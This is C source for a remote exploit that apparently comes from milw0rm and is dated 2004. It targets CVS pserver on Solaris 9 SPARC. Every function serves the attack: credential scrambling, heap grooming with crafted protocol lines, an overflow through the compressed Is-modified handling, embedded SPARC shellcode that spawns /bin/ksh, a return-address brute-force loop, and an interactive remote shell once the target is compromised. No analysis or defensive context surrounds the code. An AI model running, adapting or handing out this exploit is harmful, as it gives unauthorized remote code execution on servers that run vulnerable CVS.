#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <netdb.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>
#include <zlib.h>

#define CVS_PORT 2401
#define RET 0xffbffd20
#define NOP 0x82102017
#define ROUND(s)    if (s % word_size) s += (word_size - (s % word_size))

unsigned char *root;
unsigned char *user;
unsigned char *pass;
unsigned char *scrambled;
unsigned char *reposit;
unsigned char *directory;
unsigned char buf[512];
unsigned char *host;
unsigned int  rport, port;
unsigned int target;
z_stream zout;
z_stream zin;
unsigned char zbuf[65536 * 4];
unsigned int zbufpos, zsent = 0;
unsigned int word_size = 8, fill_size;
unsigned int len1, len2, len3;
unsigned int oflip, change, retaddr;

char entry1[64], entry2[64], entry3[64];

struct expl {
        char            *name;
                unsigned int    retadd;
} serve[] = { 
{ "cvs-1.11.1p1 - Solaris9 / SPARC", 0xd4cc8},
{ "cvs-1.12.2 - Solaris9 / SPARC", 0xd7ae8 + 8192},
{ "cvs-1.9.28 - Solaris 9 / SPARC", 0xd25b8},
{ "Crash server", 0x41414141}, 
{ "Crash server 2", 0x77777777}, 
{ "Stack ret test", 0xffbffd20},
{ "Heap ret test", 0x00031337}, 
{ NULL, 0}
};

char shellcode[]=
    "\x21\x18\xd8\x58"     // sethi  %hi(0x63616000), %l0
    "\xa0\x14\x23\x61"     // or  %l0, 0x361, %l0
    "\x90\x10\x20\x01"     // mov  1, %o0
    "\x92\x0b\x80\x0e"     // and  %sp, %sp, %o1
    "\x94\x10\x20\x04"     // mov  4, %o2
    "\x82\x10\x20\x04"     // mov  4, %g1
    "\x91\xd0\x20\x08"     // ta  8
/* lsd shellcode. */ 
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh";

char *scramble(char * str);

void handler(int sig)
{
    signal(SIGPIPE, handler);
}

/*   
 * This function reads from socket s until either max bytes are read, 
 * a newline is read, or timeout seconds elapse with no data over the 
 * socket.
 *   return values:
 *     -2: timeout
 *     -1: error
 *     0: connection closed
 *     x: normal success, x bytes read
 */
int timeout_read(int s, char *buf, int max, int timeout)
{
    int total = 0;
    int r = 0;
    int s_flags;
    char c;
    struct timeval to;
    fd_set rset;
    
    memset(&to, '\0', sizeof(to));
    to.tv_sec = timeout;
    to.tv_usec = 0;
    
    s_flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, s_flags | O_NONBLOCK);

    while(total < max)
    {
FD_ZERO(&rset);
FD_SET(s, &rset);
select(s + 1, &rset, NULL, NULL, &to);

if (FD_ISSET(s, &rset))
{
    r = read(s, &c, 1);
    total += r;

    if(r == -1)
    {
if (errno != EWOULDBLOCK)
{
    fcntl(s, F_SETFL, s_flags);
    return -1;
}
else
    continue;
    }
    else if(r == 0)
    {
fcntl(s, F_SETFL, s_flags);
return 0;
    }
    else /* r == 1 */
    {
buf[total-1] = c;
if(c == '\n')
    break;
    }
    
}
else
{
    fcntl(s, F_SETFL, s_flags);
    return -2;
}
    }
    
    fcntl(s, F_SETFL, s_flags);
    return total; 
}

void zflush(int sockfd)
{
    static char         outbuf[65536];

    zout.next_in = zbuf;
    zout.avail_in = zbufpos;

    do {
        zout.next_out = outbuf;
        zout.avail_out = sizeof(outbuf);
        if(deflate(&zout, Z_PARTIAL_FLUSH) == -1)
        {
printf("[--] Compression error.\n");
exit(1);
}
        zsent += sizeof(outbuf) - zout.avail_out;
        write(sockfd, outbuf, sizeof(outbuf) - zout.avail_out);
    } while (zout.avail_in != 0);

    zbufpos = 0;

    return;
}

int zwrite(char *buf, int len, int sockfd)
{
    if ((sizeof(zbuf) - zbufpos) < (len))
        zflush(sockfd);

    memcpy(zbuf + zbufpos, buf, len);
    zbufpos += len;

    if (zbufpos >= sizeof(zbuf))
    {
printf("[--] zwrite compression error.\n");
exit(1);
    }

    return (len);
}

int zgetch(int sockfd)
{
    static char         * outbuf = NULL;
    static int          outpos = 0, outlen = 0;
    static char         rcvbuf[32768];
    static char         dbuf[4096];
    int                 got;

  retry:
    if (outpos < outlen && outlen)
        return outbuf[outpos++];
    free(outbuf);
    outlen = 0;
    outbuf = NULL;
    got = read(sockfd, rcvbuf, sizeof(rcvbuf));
    if (got <= 0)
    {
printf("[--] Socket error.\n");
exit(1);
    }
    zin.next_in = rcvbuf;
    zin.avail_in = got;
    while (1)
        {
           int status, dlen;

            zin.next_out = dbuf;
            zin.avail_out = sizeof(dbuf);
            status = inflate(&zin, Z_PARTIAL_FLUSH);
            switch (status)
                {
                case Z_OK:
                    outpos = 0;
                    dlen = sizeof(dbuf) - zin.avail_out;
                    outlen += dlen;
                    outbuf = realloc(outbuf, outlen);
                    memcpy(outbuf + outlen - dlen, dbuf, dlen);
                    break;
                case Z_BUF_ERROR:
                    goto retry;
                default:
                    printf("[--] Revc inflate error.\n");
                }
        }
}

char *zgets(int sockfd)
{
    static char         buf[32768];
    char                * p = buf;
    int                 c;

    while (1)
        {
            c = zgetch(sockfd);
            if (c == '\n')
                break;
            *p++ = c;
            if (p > buf + sizeof(buf))
                {
                    p--;
                    break;
                }
        }
    *p = 0;
    return (buf);
}

int do_compression(int s)
{
char buf[3000];
int term = 0, i = 0;

deflateInit(&zout, 1);
        inflateInit(&zin);

memset(buf, 0x0, 300);
sprintf(buf, "Gzip-stream 1\n");

write(s, buf, strlen(buf));
}

int do_auth(int s)
{
char* str = malloc(50000);
        if(str == 0)
        {
            perror("malloc");
            exit(1);
        }
strcpy(str, "BEGIN AUTH REQUEST");
strncat(str, "\n", 1);
strncat(str, reposit, strlen(reposit));
strncat(str, "\n", 1);
strncat(str, user, strlen(user));
strncat(str, "\n", 1);
scrambled = scramble(pass);
strncat(str, scrambled, strlen(scrambled));
strncat(str, "\n", 1);
strncat(str, "END AUTH REQUEST", 16);
strncat(str, "\n", 1);
write(s, str, strlen(str)); 
free(str);

return 0;
}

int do_root(int s)
{
char* str = malloc(5000);

        bzero(str, 5000);
strncat(str, "Root ", 5);
strncat(str, root, strlen(root));
strncat(str, "\n", 1);
write(s, str, strlen(str));
free(str);

return 0;
}

int do_sized_entry(int s, char *e1, char *e2, int size)
{
char *str = malloc(size * 2);
char *tmp = malloc(size); 
int x = 0;
int term = 0;

if(str == 0 || tmp == 0 || size < (strlen(e1) + strlen(e2) + 4))
{
return;
}

bzero(str, size*2);
bzero(tmp, size);
sprintf(tmp, "Entry /%s/%s/", e1, e2);
strcat(str, tmp);
term = strlen(str);

x = term; 
while(x < (size - 1))
             str[x++] = 0xff;

strcat(str, "\n");

str[term] = 0;

write(s, str, size);
free(str);

return(0);
}

int normalize_heap(int sockfd)
{
int i;
char buff[8192 + 128];

memset(buff, 0x0, 8192 + 128);
memset(buff, 0x62, 8190);
memcpy(buff, "Argument ", 9);
strcat(buff, "\n"); 
buff[72] = 0;

for( i = 0 ; i < 128 ; i++)
{
write(sockfd, buff, 8191);
} 

memset(buff, 0x0, 8192 + 128);
memset(buff, 0x62, 8190);
memcpy(buff, "Argument ", 9); 
strcat(buff, "\n");
buff[65] = 0; 

for(i = 0 ; i < 64 ; i++)
{
write(sockfd, buff, 8191);
}

memset(buff, 0x0, 8192 + 128);
        memset(buff, 0x62, 8190);
        memcpy(buff, "Argument ", 9);
        strcat(buff, "\n");   
buff[44] = 0;

for(i = 0 ; i < 32 ; i++)
{
write(sockfd, buff, 8191);
}
memset(buff, 0x0, 8192 + 128);
        memset(buff, 0xff, 8193);
        memcpy(buff, "Argument ", 9);
        strcat(buff, "\n");   

write(sockfd, buff, 8194);
}

int correctly_fill_hole(int sockfd, int fill)
{
int chunk_size, chunk_size2;
int num_chunks;
int leftover, i = 0;
char buf[256];
char pad[1024];
char buff[2048];
unsigned long addr = RET;
char addrbuf[4096];

chunk_size = (1024 + word_size);
num_chunks = (fill / chunk_size);
leftover = (fill % chunk_size);

memset(pad, 0x0, 1024);
memset(pad, 0x88, ((1024 - 8) / 2));
memset(buff, 0x0, 2048);

        /* The exploit will almost certainly fail if leftover == 0
         * however in theory this should never actually happen.
         */
if(leftover == 0)
{
for(i = 0; i < num_chunks && fill > 0; i++)
{
          do_sized_entry(sockfd, pad, pad, fill - (1024 + word_size));
  fill -= (1024 + word_size);
}
}
else
{
for(i = 0; i < (num_chunks -2) && fill > 0; i++)
{
          do_sized_entry(sockfd, pad, pad, fill - (1024 + word_size));
  fill -= (1024 + word_size);
}
chunk_size2 = (chunk_size * 2 + leftover); 
ROUND(chunk_size2);
memset(buff, 0x0, 2048);
memset(buff, 0xff, (chunk_size2 - 8) / 2);
memset(addrbuf, 0x0, sizeof(addrbuf)); 
for(i = 0 ; i < (((chunk_size2 - 8) / 2) -4) ; i += 4) 
    *(int *)&addrbuf[i] = htonl(RET);

memcpy(buff+1, addrbuf, strlen(addrbuf)); 
do_sized_entry(sockfd, buff, buff, 4096);
}

memset(buff, 0x0, 2048);
memset(buff, 0xff, 34);

memset(addrbuf, 0x0, sizeof(addrbuf));
for(i = 0; i < 28; i+=4)
    *(int *)&addrbuf[i] = htonl(RET);

memcpy(buff+7, addrbuf, strlen(addrbuf));

do_sized_entry(sockfd, buff, buff, 97);
}

int do_ismodified(int s, char *e1)
{ 
char *str = (char *) malloc(100000);
int x = 0, term = 0;

        bzero(str, 100000);

sprintf(str,"Is-modified %s\n", e1);

zwrite(str, strlen(str), s);
zflush(s); 

free(str);

return 0;
}

int do_argument(int sockfd)
{
char *exp;

exp = (char *) malloc(20000);

memset(exp, 0x0, 20000);
memset(exp, 0x69, 19680 + strlen("Argument "));

memcpy(exp, "Argument ", strlen("Argument "));

exp[19680 + strlen("Argument ")] = '\n';

write(sockfd, exp, strlen(exp));

return(0);
}

int do_resize(int sockfd)
{
char buffer[256];
int x = 0;
memset(buffer, 0x0, 256);
memset(buffer, 0xff, 255);

buffer[254] = '\n';

memcpy(buffer, "Argumentx ", strlen("Argumentx "));

buffer[74 + 44] = 0;

zwrite(buffer, 255, sockfd);
zflush(sockfd);
}

int do_overflow(int sockfd)
{
char buffer[20000];
int i = 0;

memset(buffer, 0x0, 20000);
memset(buffer, 0x42, 19782);

for(i = 0 ; i < 19780-8; i+=4)
   *(unsigned int *)&buffer[i] = htonl(retaddr);
 
for(i = 0; i < 19600; i+=4)
           *(unsigned int *)&buffer[i] = htonl(NOP); 
 
        memcpy(buffer+19000, shellcode, strlen(shellcode));

memcpy(buffer, "Argument ", strlen("Argument "));
buffer[19781] = '\012';

zwrite(buffer, 19782, sockfd);
zflush(sockfd);
}

int work_around_zlib_bug(int sockfd)
{
char buffer[4096];
char data[64];

memset(data, 0x0, 64);
memset(data, 0x42, 32);

memset(buffer, 0x0, 4096);
memset(buffer, 0x42, 4000);

sprintf(buffer, "Entry /%s/%s/", data, data);

buffer[2999] = '\n';

zwrite(buffer, 3000, sockfd);
zflush(sockfd);
} 

unsigned char auth_shifts[] ={
   0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15,
  16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
 114,120, 53, 79, 96,109, 72,108, 70, 64, 76, 67,116, 74, 68, 87,
 111, 52, 75,119, 49, 34, 82, 81, 95, 65,112, 86,118,110,122,105,
  41, 57, 83, 43, 46,102, 40, 89, 38,103, 45, 50, 42,123, 91, 35,
 125, 55, 54, 66,124,126, 59, 47, 92, 71,115, 78, 88,107,106, 56,
  36,121,117,104,101,100, 69, 73, 99, 63, 94, 93, 39, 37, 61, 48,
  58,113, 32, 90, 44, 98, 60, 51, 33, 97, 62, 77, 84, 80, 85,223,
 225,216,187,166,229,189,222,188,141,249,148,200,184,136,248,190,
 199,170,181,204,138,232,218,183,255,234,220,247,213,203,226,193,
 174,172,228,252,217,201,131,230,197,211,145,238,161,179,160,212,
 207,221,254,173,202,146,224,151,140,196,205,130,135,133,143,246,
 192,159,244,239,185,168,215,144,139,165,180,157,147,186,214,176,
 227,231,219,169,175,156,206,198,129,164,150,210,154,177,134,127,
 182,128,158,208,162,132,167,209,149,241,153,251,237,236,171,195,
 243,233,253,240,194,250,191,155,142,137,245,235,163,242,178,152 };

char *scramble(char * str)
{
int i;
    char * s;
                
    s = (char *) malloc (strlen (str) + 3);
    memset(s, '\0', strlen(str) + 3);
    *s = 'A';
    for (i = 1; str[i - 1]; i++)
        s[i] = auth_shifts[(unsigned char)(str[i - 1])];
    return (s);
}

int usage(char *name)
{
printf("usage: %s [options]\n", name);
        printf("Options:\n");
        printf("  -t     Desired target\n");
        printf("  -r     CVS root\n");
        printf("  -u     CVS user\n");
        printf("  -p     Password\n");
        printf("  -h     Targeted host\n"); 
        printf("  -P     Port running CVS\n"); 
             
        printf("\nAvailable targets:\n"); 
        for (target = 0; serve[target].name != NULL; target++) 
        printf("[%i] - %s\n", target, serve[target].name); 
        exit(0);
}

int do_shell(int sockfd)
{
while(1)
         {
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(0,&fds);
            FD_SET(sockfd,&fds);
            if(select(FD_SETSIZE,&fds,NULL,NULL,NULL))
            {
               int cnt;
               char buf[1024];
               if(FD_ISSET(0,&fds))
               {
                  if((cnt=read(0,buf,1024))<1)
                  {
                     if(errno==EWOULDBLOCK||errno==EAGAIN)
                       continue;
                     else
                       break;
                  }
                  write(sockfd,buf,cnt);
               }
               if(FD_ISSET(sockfd,&fds))
               {
                  if((cnt=read(sockfd,buf,1024))<1)
                  {
                       if(errno==EWOULDBLOCK||errno==EAGAIN)
                         continue;
                       else
                         break;
                  }
                  write(1,buf,cnt);
               }
            }
         }               
}

int main(int argc, char *argv[])
{
int i, sockfd, len, result,x;
        char c;
struct sockaddr_in addr;
struct hostent *hostinfo;

if(argc == 1)
{
        usage(argv[0]);    
        }

port = CVS_PORT; 
        while((c = getopt(argc, argv, "t:r:u:d:p:h:")) != EOF)
        { 
        switch(c) 
                { 
                       case 't': 
                         target = atoi(optarg); 
                         break; 
                       case 'r': 
                         root = strdup(optarg); 
                         reposit = strdup(optarg); 
                         break; 
                       case 'u': 
                         user = strdup(optarg); 
                         break; 
                       case 'd': 
                         directory = strdup(optarg); 
                         break;
                       case 'p':
                         pass = strdup(optarg);
                         break;
                       case 'h':
                         host = strdup(optarg);
                         break;
                       default:
         usage(argv[0]);
       }                  
}

hostinfo = gethostbyname(host);
if(!hostinfo)
{
perror("gethostbyname()");
exit(0);
}

sockfd = socket(AF_INET, SOCK_STREAM, 0);

addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr = *(struct in_addr *)*hostinfo -> h_addr_list;
len = sizeof(addr);

printf("Attacking %s running %s\n", host, serve[target].name);
printf("[");
fflush(stdout);

retaddr = serve[target].retadd;

    while(1)
    {
sockfd = socket(AF_INET, SOCK_STREAM, 0); 
result = connect(sockfd, (struct sockaddr *)&addr, len);
if(result == -1)
{
perror("connect()");
exit(0);
}

do_auth(sockfd);
timeout_read(sockfd, buf, sizeof(buf)-1, 3); 
do_root(sockfd);

normalize_heap(sockfd);

do_argument(sockfd);
        
        fill_size = 19680;

memset(entry1, 0x41, 60);
memset(entry2, 0x42, 60);
memset(entry3, 0x43, 60);

do_sized_entry(sockfd, entry1, entry1, fill_size - (128+word_size) );
        fill_size -= (128 + word_size);
        do_sized_entry(sockfd, entry2, entry2, fill_size - (128+word_size) );
        fill_size -= (128 + word_size);
        do_sized_entry(sockfd, entry3, entry3, fill_size - (128+word_size) );
        fill_size -= (128 + word_size);
     
correctly_fill_hole(sockfd, fill_size - (64 + word_size));
       
do_compression(sockfd);

len1 = ( 5 + 4 + 16); 
        len2 = ( 144 + 8 + 5 + 1);
len3 = ( 144 + 8 + 128 + 8 + 5 + 0);

for(i = 0; i < len1; i++)
            do_ismodified(sockfd, entry1);

for(i = 0; i < len2; i++)
            do_ismodified(sockfd, entry2);

for(i = 0; i < len3; i++)
            do_ismodified(sockfd, entry3);

work_around_zlib_bug(sockfd);

do_resize(sockfd);

        do_overflow(sockfd);

printf(".");
fflush(stdout);

while(1)
{
    result = timeout_read(sockfd, buf, 4, 5);
    if(result == -1 || result == 0)
    {
break;
    }
      if(result == -2)
    {
printf("\n Timeout... trying for shell\n"); 
do_shell(sockfd);
break;
    } 
/* Maybe use strstr and a larger read buffer here ? */
    if(strncmp(buf, "caca", 4) == 0)
    {
printf("]\n");
printf("[+] 0wned!@ With retaddr = 0x%x\n", retaddr);
do_shell(sockfd);
exit(0);
    }
}

change += 12000;

        if(oflip == 0)
        {
            retaddr = serve[target].retadd + change;
            oflip = 1;
        }
        else if(oflip == 1)
        {
            retaddr = serve[target].retadd - change;
            oflip = 0;
        }

close(sockfd);
    } 
}

// milw0rm.com [2004-06-25]
